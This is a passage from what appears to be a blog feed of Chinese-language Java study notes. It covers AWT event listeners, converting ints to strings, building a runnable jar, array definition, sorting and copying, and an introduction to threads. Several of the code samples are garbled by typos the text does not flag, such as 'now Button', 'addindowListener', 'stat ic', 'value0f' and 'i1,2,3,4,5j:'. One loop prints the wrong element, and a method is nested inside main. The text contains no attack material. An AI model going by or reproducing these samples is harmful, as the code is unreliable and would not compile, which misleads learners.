class="code"><pre><span class="line"><span class="keyword">import</span> java. awt.*;</span><br><span class="line"><span class="keyword">import</span> java. awt.eventl*;</span><br><span class="line"><span class="keyword">public</span> <span class="class"><span class="keyword">class</span> <span class="title">TestButton</span></span></span><br><span class="line"><span class="class"></span>&#123;</span><br><span class="line"><span class="function"><span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title">main</span><span class="params">(String[] args)</span></span></span><br><span class="line"><span class="function">    </span>&#123;</span><br><span class="line">        Frame f = <span class="keyword">new</span> Frame();</span><br><span class="line">        Button bn =<span class="function">now <span class="title">Button</span><span class="params">(<span class="string">&quot;OK&quot;</span>)</span></span>;</span><br><span class="line">        f.add(bn);</span><br><span class="line">        A aa = <span class="keyword">new</span> A();</span><br><span class="line">        </span><br><span class="line">        bn.addActionListener(aa);</span><br><span class="line">        </span><br><span class="line">        f.pack();</span><br><span class="line">        f.addindowListener(<span class="keyword">new</span> B()); <span class="comment">//f这个窗口，注册一个监听</span></span><br><span class="line">        </span><br><span class="line">        f.setVisible(<span class="keyword">true</span>);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">A</span> <span class="keyword">implements</span> <span class="title">Actionlistener</span></span></span><br><span class="line"><span class="class"></span>&#123;</span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="keyword">void</span> <span class="title">actionPerformed</span><span class="params">(ActionEvent e)</span></span></span><br><span class="line"><span class="function">    </span>&#123;</span><br><span class="line">    System.out.println(<span class="string">&quot;今天我很爽!&quot;</span>);</span><br><span class="line">        <span class="comment">//System.exit(-1);</span></span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">B</span> <span class="keyword">extends</span> <span class="title">WindowAdapter</span></span></span><br><span class="line"><span class="class"></span>&#123;</span><br><span class="line"><span class="function"><span class="keyword">public</span> <span class="keyword">void</span> <span class="title">windowClosing</span><span class="params">(WindowEvent e)</span></span></span><br><span class="line"><span class="function">    </span>&#123;</span><br><span class="line">System.exit(-<span class="number">1</span>);</span><br><span class="line">&#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>​    要对某个事件进行处理就add这个事件的名字后面加监听器，括号是对那个对象进行监听，a对象之所以可以监听是因为<strong>实现了接口的方法</strong></p><p>​    B本应该写<code>implements</code>，但如果写<code>implements</code>只重写一个接口，那个类还是抽象类，抽象类的抽象方法都要实现，所以写<code>extends</code></p><p>​    一个组件要想让他产生反应，添加一个相应组件的监听器，括号写的是实现监听器接口的对象</p><h2 id="事件处理步骤"><a href="#事件处理步骤" class="headerlink" title="事件处理步骤"></a>事件处理步骤</h2><p>假设事件为XXXX</p><p>​    1.向事件源注册某种事件的事件监听器对象</p><p>​          <code>addXXXXListener(..…);</code></p><p>​    2.设计好可以处理这种事件的事件监听器</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="class"><span class="keyword">class</span> 类名 <span class="keyword">implements</span> <span class="title">XXXXListener</span></span></span><br><span class="line"><span class="class"></span>&#123;</span><br><span class="line">重写XXXXListener接口中的方法</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>说明<br>要想设计出能够处理 XXXX 事件的监听器，只需要编写出实现了 XXXXListener 接口的类就OK了，因为 XXXXListener 接口中已经定义了可以处理 XXXX 事件的方法</p><h2 id="事件处理相关概念-1"><a href="#事件处理相关概念-1" class="headerlink" title="事件处理相关概念"></a>事件处理相关概念</h2><ul><li>默认情况下事件源不会自动产生任何事件，程序员需要做两件事：<ul><li><strong>告诉事件源可以自动产生哪类事件</strong>，即：向事件源注册某种事件的事件监听器对象</li><li><strong>设计好可以处理这种事件的事件监听器</strong></li></ul></li><li>一旦完成了这两步操作，当用户对事件源进行操作时，事件源就会自动产生事件，事件源就会自动把产生的事件封装成一个事件对象，事件源就会自动把封装好的事件对象传递给事件监听器</li><li>事件监听器收到事件源发送过来的事件时，事件监听器就会自动调用相应的事件处理方法来对该事件进行相应的处理</li></ul><h2 id="事件处理示意图"><a href="#事件处理示意图" class="headerlink" title="事件处理示意图"></a>事件处理示意图</h2><p><img src="/2021/04/18/Java-8%E5%9B%BE%E5%BD%A2%E5%8C%96%E7%95%8C%E9%9D%A2/%E4%BA%8B%E4%BB%B6%E5%A4%84%E7%90%86%E7%A4%BA%E6%84%8F%E5%9B%BE.png"></p><p><strong>注册和实现某种监听器接口的类对象</strong>这两步是由程序员完成的,其他步骤由编译器自动完成</p><h2 id="TestField监听器"><a href="#TestField监听器" class="headerlink" title="TestField监听器"></a>TestField监听器</h2><p><img src="/2021/04/18/Java-8%E5%9B%BE%E5%BD%A2%E5%8C%96%E7%95%8C%E9%9D%A2/TestField%E7%9B%91%E5%90%AC%E5%99%A8.png"></p><p><code>@OVerride</code>：告诉编译器下面的方法是程序员重写父类的方法，不是自己定义的，如果写成了定义就会报错</p><h2 id="文本转字符串转"><a href="#文本转字符串转" class="headerlink" title="文本转字符串转"></a>文本转字符串转</h2><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="class"><span class="keyword">class</span> <span class="title">TestInt</span></span></span><br><span class="line"><span class="class"></span>&#123;</span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title">main</span><span class="params">(String[]] args)</span></span></span><br><span class="line"><span class="function">    </span>&#123;</span><br><span class="line">        <span class="keyword">int</span> i = <span class="number">345</span>;</span><br><span class="line">        String str; </span><br><span class="line">        <span class="comment">//第一种方法</span></span><br><span class="line">        str = i + <span class="string">&quot;&quot;</span>;</span><br><span class="line">        System.out.println(<span class="string">&quot;str = &quot;</span> + str);</span><br><span class="line">        </span><br><span class="line">        <span class="comment">//第二种</span></span><br><span class="line">        Integer it = <span class="function">now <span class="title">Integer</span><span class="params">(i)</span></span>;</span><br><span class="line">        str = it.toString();</span><br><span class="line">        System.out.println(<span class="string">&quot;str = &quot;</span> + str);</span><br><span class="line">        </span><br><span class="line">        <span class="comment">//第三种</span></span><br><span class="line">        str = Integer.toString(i);</span><br><span class="line">        System.out.println(<span class="string">&quot;str = &quot;</span> + str);</span><br><span class="line">        </span><br><span class="line">        <span class="comment">//第四种</span></span><br><span class="line">        str = String.value0f(i);</span><br><span class="line">        System.out.println(<span class="string">&quot;str = &quot;</span> + str);</span><br><span class="line">        </span><br><span class="line">        <span class="comment">//第五种:本方法不对</span></span><br><span class="line">str = i; <span class="comment">//error 不兼容</span></span><br><span class="line">        System.out.println(<span class="string">&quot;str = &quot;</span> + str);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h1 id="可运行jar包生成步骤"><a href="#可运行jar包生成步骤" class="headerlink" title="可运行jar包生成步骤"></a>可运行jar包生成步骤</h1><ol><li><p>新建一个记事本文件，假设为1.xt，文件内容：</p><p>​    Main-Class：可运行类的名字<br>​    附注：记着敲回车</p></li><li><p>dos下命令:<br><code>jar cvfm haha.jar 1.txt*.class</code></p><p>记住:</p><p>只有GUI程序生成的class文件才可以作为main  class</p></li></ol>]]></content>
    
    
      
      
    <summary type="html">&lt;h1 id=&quot;awt-图形化界面&quot;&gt;&lt;a href=&quot;#awt-图形化界面&quot; class=&quot;headerlink&quot; title=&quot;awt 图形化界面&quot;&gt;&lt;/a&gt;awt 图形化界面&lt;/h1&gt;&lt;figure class=&quot;highlight java&quot;&gt;&lt;table&gt;&lt;tr&gt;&lt;td</summary>
      
    
    
    
    <category term="Java" scheme="http://example.com/categories/Java/"/>
    
    
  </entry>
  
  <entry>
    <title>Java 7数组</title>
    <link href="http://example.com/2021/04/18/Java-7%E6%95%B0%E7%BB%84/"/>
    <id>http://example.com/2021/04/18/Java-7%E6%95%B0%E7%BB%84/</id>
    <published>2021-04-18T12:04:13.000Z</published>
    <updated>2021-04-20T13:56:20.107Z</updated>
    
    <content type="html"><![CDATA[<h1 id="定义数组"><a href="#定义数组" class="headerlink" title="定义数组"></a>定义数组</h1><p><strong>数组赋值时前后框框不能有数值</strong></p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">public</span> stat ic <span class="keyword">void</span> <span class="title">main</span><span class="params">(String[] args)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    <span class="comment">//方式一</span></span><br><span class="line"><span class="keyword">int</span>[] arr1;</span><br><span class="line">arr1 = <span class="keyword">new</span> <span class="keyword">int</span> [<span class="number">3</span>];</span><br><span class="line">    arr1[<span class="number">0</span>] = <span class="number">0</span>;</span><br><span class="line">arr1[<span class="number">1</span>] = <span class="number">1</span>;</span><br><span class="line">    arr1[<span class="number">2</span>] = <span class="number">2</span>;</span><br><span class="line">    showArr(arr1);</span><br><span class="line">System.<span class="function">out <span class="title">println</span><span class="params">(<span class="string">&quot;**********************&quot;</span>)</span></span>;</span><br><span class="line">    </span><br><span class="line">    <span class="comment">//方式二</span></span><br><span class="line"><span class="keyword">int</span>[] arr2 = now <span class="keyword">int</span>[]&#123;<span class="number">0</span>,<span class="number">1</span>,<span class="number">2</span>&#125;;</span><br><span class="line">    showArr(arr2) ;</span><br><span class="line">System.out.println(<span class="string">&quot;************************&quot;</span>);</span><br><span class="line"><span class="comment">//System.out.printin(arr1); //error 一维数组的内容是不能通过System.out.printin(arr1)直接输出</span></span><br><span class="line">    </span><br><span class="line">    <span class="comment">//int[3] arr3 = new int[]&#123;0,1,2&#125;; //error</span></span><br><span class="line"><span class="comment">//int[] arr4 = new int[3]&#123;0, 1,2&#125;; //error </span></span><br><span class="line">    <span class="comment">//int[3] arr5 = new int[3]&#123;0,1,2&#125;; //error</span></span><br><span class="line">    <span class="comment">//数组赋值时前后框框不能有数值</span></span><br><span class="line">    </span><br><span class="line">    <span class="comment">//方式三</span></span><br><span class="line"><span class="keyword">int</span>[] arr6 = &#123;<span class="number">0</span>,<span class="number">1</span>,<span class="number">2</span>&#125;; <span class="comment">//25行</span></span><br><span class="line">    showArr(arr6);</span><br><span class="line">System.out.println(<span class="string">&quot;**********************&quot;</span>);</span><br><span class="line">arr6 = <span class="keyword">new</span> <span class="keyword">int</span>[]&#123;<span class="number">5</span>,<span class="number">4</span>, <span class="number">3</span>,<span class="number">2</span>,<span class="number">1</span>&#125;; <span class="comment">//arr6本来是指向25行的&#123;1,2,3&#125;</span></span><br><span class="line">    showArr(arr6);</span><br><span class="line">    </span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title">showArr</span><span class="params">(<span class="keyword">int</span>[] arr)</span></span></span><br><span class="line"><span class="function">    </span>&#123;</span><br><span class="line"><span class="keyword">for</span> (<span class="keyword">int</span> i = <span class="number">0</span>; i&lt;arr.length; ++i)</span><br><span class="line">System.out.println(arr[i]);</span><br><span class="line">&#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h1 id="创建并使用基本类型数组示意图"><a href="#创建并使用基本类型数组示意图" class="headerlink" title="创建并使用基本类型数组示意图"></a>创建并使用基本类型数组示意图</h1><p>星星为程序运行处</p><p>图一</p><p><img src="/2021/04/18/Java-7%E6%95%B0%E7%BB%84/%E5%9F%BA%E6%9C%AC%E7%B1%BB%E5%9E%8B%E6%95%B0%E7%BB%841.png"></p><p>图二</p><p><img src="/2021/04/18/Java-7%E6%95%B0%E7%BB%84/%E5%9F%BA%E6%9C%AC%E7%B1%BB%E5%9E%8B%E6%95%B0%E7%BB%842.png"></p><p>图三</p><p><img src="/2021/04/18/Java-7%E6%95%B0%E7%BB%84/%E5%9F%BA%E6%9C%AC%E7%B1%BB%E5%9E%8B%E6%95%B0%E7%BB%843.png"></p><h1 id="创建并使用引用类型数组"><a href="#创建并使用引用类型数组" class="headerlink" title="创建并使用引用类型数组"></a>创建并使用引用类型数组</h1><p>图一</p><p><img src="/2021/04/18/Java-7%E6%95%B0%E7%BB%84/%E5%BC%95%E7%94%A8%E7%B1%BB%E5%9E%8B%E6%95%B0%E7%BB%841.png"></p><p>图二</p><p><img src="/2021/04/18/Java-7%E6%95%B0%E7%BB%84/%E5%BC%95%E7%94%A8%E7%B1%BB%E5%9E%8B%E6%95%B0%E7%BB%842.png"></p><p>图三</p><p><img src="/2021/04/18/Java-7%E6%95%B0%E7%BB%84/%E5%BC%95%E7%94%A8%E7%B1%BB%E5%9E%8B%E6%95%B0%E7%BB%843.png"></p><p>图四</p><p><img src="/2021/04/18/Java-7%E6%95%B0%E7%BB%84/%E5%BC%95%E7%94%A8%E7%B1%BB%E5%9E%8B%E6%95%B0%E7%BB%844.png"></p><p>​    <strong>引用类型元素组成的一维数组在使用过程中一般存在着两级的指向关系，这是理解多维不等长数组的基础</strong></p><h1 id="多维数组"><a href="#多维数组" class="headerlink" title="多维数组"></a>多维数组</h1><p>举例</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">int</span>[][] xx = <span class="keyword">new</span> <span class="keyword">int</span>[<span class="number">2</span>][<span class="number">3</span>]; <span class="comment">//等长数组</span></span><br><span class="line"><span class="keyword">int</span>[][] xx = &#123;&#123;<span class="number">3</span>,<span class="number">2</span>,<span class="number">7</span>&#125;,&#123;<span class="number">1</span>,<span class="number">5</span>&#125;,&#123;<span class="number">6</span>&#125;; <span class="comment">//不等长数组</span></span><br></pre></td></tr></table></figure><p><img src="/2021/04/18/Java-7%E6%95%B0%E7%BB%84/%E4%B8%8D%E7%AD%89%E9%95%BF%E6%95%B0%E7%BB%84%E4%BE%8B%E5%AD%90.png"></p><h1 id="数组的排序"><a href="#数组的排序" class="headerlink" title="数组的排序"></a>数组的排序</h1><p><code>java.unti.Arrays类</code>中的<code>sort方法</code>可以实现对数组的排序</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">int</span>[] a = &#123;<span class="number">6</span>,<span class="number">23</span>,<span class="number">45</span>,<span class="number">12</span>,-<span class="number">83</span>,<span class="number">94</span>,<span class="number">41</span>&#125;;<span class="comment">//创建样本数组</span></span><br><span class="line"></span><br><span class="line">Arrays.sort(a); <span class="comment">//数组排序</span></span><br><span class="line"></span><br><span class="line"><span class="comment">//排序后将数组元素输出</span></span><br><span class="line"><span class="keyword">for</span>(<span class="keyword">int</span> i=<span class="number">0</span>; i&lt;a.length; i++)</span><br><span class="line">&#123;</span><br><span class="line">System.out.print(arr[<span class="number">1</span>]+<span class="string">&quot;\t&quot;</span>);</span><br><span class="line">&#125;</span><br><span class="line">______________________________________</span><br><span class="line">    输出结果：</span><br><span class="line">    -<span class="number">83</span> <span class="number">6</span> <span class="number">12</span> <span class="number">23</span> <span class="number">41</span> <span class="number">45</span> <span class="number">94</span></span><br></pre></td></tr></table></figure><h1 id="数组的拷贝"><a href="#数组的拷贝" class="headerlink" title="数组的拷贝"></a>数组的拷贝</h1><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title">arraycopy</span><span class="params">( Object arr1, <span class="keyword">int</span> pos1, Object arr2, <span class="keyword">int</span> pos2, <span class="keyword">int</span> length)</span></span>;</span><br><span class="line">将arr1所指向的数组中下标从pos1开始的总共length个元素</span><br><span class="line">覆盖掉arr2所指向的数组中从pos2开始的length个元素</span><br></pre></td></tr></table></figure><p>注意:<br>    arr1是源数组  arr2是目的数组!   arraycopy()全是小写，不能是大写!</p><p>例子：</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">int</span> source[] = &#123;<span class="number">1</span>,<span class="number">2</span>,<span class="number">3</span>,<span class="number">4</span>,<span class="number">5</span>,<span class="number">6</span>&#125;; <span class="comment">//源数组</span></span><br><span class="line"><span class="keyword">int</span> dest[] = &#123;<span class="number">10</span>,<span class="number">9</span>,<span class="number">8</span>,<span class="number">7</span>,<span class="number">6</span>,<span class="number">5</span>,<span class="number">4</span>,<span class="number">3</span>,<span class="number">2</span>,<span class="number">1</span>&#125;; <span class="comment">//目的数组</span></span><br><span class="line"></span><br><span class="line">System.arraycopy(source,<span class="number">0</span>,dest,<span class="number">2</span>,<span class="number">3</span>);</span><br><span class="line"><span class="comment">//将source数组中下标从0开始的总共3个元素的值复制给dest数组中下标从2开始的3个元素</span></span><br></pre></td></tr></table></figure><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">// System.arraycpoy(); 的用法</span></span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">TestArrayCopy</span></span></span><br><span class="line"><span class="class"></span>&#123;</span><br><span class="line"><span class="function"><span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title">main</span><span class="params">(String[] args)</span></span></span><br><span class="line"><span class="function">    </span>&#123;</span><br><span class="line">        <span class="keyword">int</span>[] a = &#123;<span class="number">1</span>,<span class="number">2</span>,<span class="number">3</span>,<span class="number">4</span>,<span class="number">5</span>&#125;;</span><br><span class="line"><span class="keyword">int</span>[] b = i1,<span class="number">2</span>,<span class="number">3</span>,<span class="number">4</span>,5j:</span><br><span class="line">System.arraycopy(a, <span class="number">0</span>, b, <span class="number">1</span>, <span class="number">2</span>); </span><br><span class="line">        System.out.println(<span class="string">&quot;a = &quot;</span>);</span><br><span class="line"><span class="keyword">for</span> (<span class="keyword">int</span> i=<span class="number">0</span>; i&lt;a.length; ++i)</span><br><span class="line">        &#123;</span><br><span class="line">System.out.println(a[i]);</span><br><span class="line">&#125;</span><br><span class="line">    &#125;   </span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> java.util.*;</span><br><span class="line"></span><br><span class="line"><span class="keyword">public</span> <span class="class"><span class="keyword">class</span> <span class="title">TestArraysSort_1</span></span></span><br><span class="line"><span class="class"></span>&#123;</span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title">main</span><span class="params">(String[] args)</span></span></span><br><span class="line"><span class="function">    </span>&#123;</span><br><span class="line">        <span class="keyword">int</span>[] data = &#123;<span class="number">1</span>,<span class="number">3</span>,<span class="number">5</span>,<span class="number">7</span>,<span class="number">2</span>,<span class="number">4</span>,<span class="number">6</span>,<span class="number">8</span>,<span class="number">10</span>,<span class="number">9</span>&#125;;</span><br><span class="line">        System.out.println(<span class="string">&quot;排序前数组data中的内容是:&quot;</span>);</span><br><span class="line">        showArray(data);</span><br><span class="line">        </span><br><span class="line">        Arrays.sort(data);</span><br><span class="line">        </span><br><span class="line">        System.out.println(<span class="string">&quot;排序后数组data中的内容是:&quot;</span>);</span><br><span class="line">        showArray(data);</span><br><span class="line">    &#125;</span><br><span class="line">    </span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title">showArray</span><span class="params">(<span class="keyword">int</span> [] dat a)</span></span></span><br><span class="line"><span class="function">    </span>&#123;</span><br><span class="line">        <span class="keyword">for</span> (<span class="keyword">int</span> e : data)</span><br><span class="line">System.out.printf(<span class="string">&quot;%d\t&quot;</span>, e);</span><br><span class="line">        System.out.println();</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>]]></content>
    
    
      
      
    <summary type="html">&lt;h1 id=&quot;定义数组&quot;&gt;&lt;a href=&quot;#定义数组&quot; class=&quot;headerlink&quot; title=&quot;定义数组&quot;&gt;&lt;/a&gt;定义数组&lt;/h1&gt;&lt;p&gt;&lt;strong&gt;数组赋值时前后框框不能有数值&lt;/strong&gt;&lt;/p&gt;
&lt;figure class=&quot;highlight j</summary>
      
    
    
    
    <category term="Java" scheme="http://example.com/categories/Java/"/>
    
    
  </entry>
  
  <entry>
    <title>Java 6线程</title>
    <link href="http://example.com/2021/04/15/Java-6%E7%BA%BF%E7%A8%8B/"/>
    <id>http://example.com/2021/04/15/Java-6%E7%BA%BF%E7%A8%8B/</id>
    <published>2021-04-15T06:09:48.000Z</published>
    <updated>2021-04-20T13:55:02.130Z</updated>
    
    <content type="html"><![CDATA[<h1 id="线程"><a href="#线程" class="headerlink" title="线程"></a>线程</h1><h2 id="什么叫程序"><a href="#什么叫程序" class="headerlink" title="什么叫程序"></a>什么叫程序</h2><p>​    所谓“程序”，是一个严格有序的指令集合。程序规定了完成某一任务时；计算机所需做的各种操作，以及这些操作的执行顺序。</p><h1 id="单道程序设计环境中程序特点"><a href="#单道程序设计环境中程序特点" class="headerlink" title="单道程序设计环境中程序特点"></a>单道程序设计环境中程序特点</h1><ul><li>单道程序设计环境是指：</li></ul><p>​        计算机中除了操作系统之外，只存在一个用户程序，即用户程序独享整个计算机资源</p><ul><li>单道程序有如下特点：<ul><li>资源的独占性:<ul><li>任何时候，位于内存中的程序可以使用系统中的一切资源,不可能有其他程序与之竞争。</li></ul></li><li>执行的顺序性:<ul><li>内存中每次只有一个程序，各个程序是按次序执行的，即做完一个，再做下一个。<br>绝对不可能出现在一个程序运行过程中，又夹杂进另一个程序执行的现象存在</li></ul></li><li>结果的再现性:<ul><li>只要执行环境和初始条件相同，重复执行一个程序，获得的结果总是一样的。</li></ul></li></ul></li></ul><h1 id="多道程序设计环境中程序特点"><a href="#多道程序设计环境中程序特点" class="headerlink" title="多道程序设计环境中程序特点"></a>多道程序设计环境中程序特点</h1><p>多道程序设计是指：</p><p>​    计算机中除了操作系统之外，存在多个用户程底，这些程序同时运行</p><p>多道程序设计有如下特点：</p><ul><li>间断性：<ul><li>由于资源共享和合作，并发程序间相互制约，造成合作执行间断。</li></ul></li><li>失去封闭性：<ul><li>程序执行受外界影响。</li></ul></li><li>不可再现性：<ul><li>重复执行时，可能得到不同结果。</li></ul></li></ul><h1 id="进程的由来"><a href="#进程的由来" class="headerlink" title="进程的由来"></a>进程的由来</h1><p>​    一方面为了保持程序“是一个在时间上严格有序的指令集合,是静态的保存在存储介质上”这个概念的原有含义，另一方面为了刻画多个程序共同运行时呈现出的这些特征，在操作系统中，以“程序”为基础，又引入了“进程”这一新的概念!</p><p>​    通俗点说，<strong>为了不破坏“程序”这个词原有的含义，而又能刻画多个程序共同运行时呈现出的新特征，所以引入了进程这一概念</strong>，按照大多数教材的说法:“为了使程序能并发执行，且为了对并发执行的程序加以描述，所以人们引入了进程”</p><h1 id="初学者要注意四个问题"><a href="#初学者要注意四个问题" class="headerlink" title="初学者要注意四个问题"></a>初学者要注意四个问题</h1><ul><li>什么是进程(尽量理解)</li><li>为什么需要进程(理解)</li><li>什么是线程(必须掌握)</li><li>为什么需要线程(不知道也没关系)</li></ul><p><strong>多线程程序在不同的路径执行，交替同时执行</strong></p><h1 id="线程的定义"><a href="#线程的定义" class="headerlink" title="线程的定义"></a>线程的定义</h1><ul><li><strong>线程是一个程序里的不同执行路径</strong></li><li>以前所编写的程序，每个程序都有一个入口、一个出口以及一个顺序执行的序列，在程序执行过程中的任何指定时刻，都只有一个单独的执行点。</li><li>事实上，在单个程序内部是可以在同一时刻进行多种运算的，这就是所谓的多线程</li><li>程序、进程、线程的异同参见操作系统，这些并不影响我们对Java的学习</li></ul><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br></pre></td><td class="code"><pre><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">A</span> <span class="keyword">extends</span> <span class="title">Thread</span></span></span><br><span class="line"><span class="class"></span>&#123;</span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="keyword">void</span> <span class="title">run</span><span class="params">()</span></span></span><br><span class="line"><span class="function">    </span>&#123;</span><br><span class="line">        <span class="keyword">while</span> (<span class="keyword">true</span>)</span><br><span class="line">        &#123;</span><br><span class="line">System.out.println(<span class="string">&quot;AAAA&quot;</span>);</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">public</span> <span class="class"><span class="keyword">class</span> <span class="title">Test</span> <span class="title">Thread_1</span></span></span><br><span class="line"><span class="class"></span>&#123;</span><br><span class="line"><span class="function"><span class="keyword">public</span> stat ic <span class="keyword">void</span> <span class="title">main</span><span class="params">(String[] args)</span></span></span><br><span class="line"><span class="function">    </span>&#123;</span><br><span class="line">        aa = <span class="keyword">new</span> A();</span><br><span class="line">aa.start(); <span class="comment">//aa. start(); 会自动调用run方法</span></span><br><span class="line">        <span class="keyword">while</span> (<span class="keyword">true</span>)</span><br><span class="line">&#123;</span><br><span class="line">System.out.println(<span class="string">&quot;BBBB&quot;</span>);</span><br><span class="line">    &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>单写aa.run跟普通调用函数一样</p><p><strong>start()的功能是</strong></p><p>​    1.开启一个新线程</p><p>​    2.执行线程，run的代码</p><p>A类继承了Thread，重写了run方法</p><p><strong>注意：要用调用run方法，写start()</strong></p><h1 id="多线程的优势"><a href="#多线程的优势" class="headerlink" title="多线程的优势"></a>多线程的优势</h1><p>多线程编程简单，效率高（能直接共享数据和资源，多进程不能</p><p>适合于开发服务程序（如Web服务，聊天服务等)</p><h1 id="创建一个线程的第一种方法"><a href="#创建一个线程的第一种方法" class="headerlink" title="创建一个线程的第一种方法"></a>创建一个线程的第一种方法</h1><ol><li>创建一个继承Thread的类(假定类名为A)，并重写Thread中的run方法</li><li>构造一个A类对象,假定对象名为aa</li><li>调用aa的start方法【start方法是从Thread继承过来的】</li></ol><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="class"><span class="keyword">class</span> <span class="title">ThreadDef1</span></span></span><br><span class="line"><span 